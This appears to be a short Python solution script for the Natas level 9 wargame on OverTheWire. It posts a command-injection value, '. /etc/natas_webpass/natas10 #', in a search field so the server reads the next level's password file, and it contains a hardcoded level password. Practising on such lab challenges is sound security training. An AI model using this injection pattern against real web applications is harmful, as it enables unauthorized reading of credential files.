#!/usr/bin/env python

# PHP Command Injection
# . /etc/natas_webpass/natas10

# import the package requests which is for html information
import requests
import re

username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'

# url = 'http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' % username
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# blank temp response = requests.get(url,auth = (username, password))

response = requests.post(url,data = { "needle" :'. /etc/natas_webpass/natas10 #', 'submit' : 'submit'} ,auth = (username, password))
content = response.text

# print(content)
# (.*)

print(re.findall("<pre>\n(.*)\n</pre>", content)[0])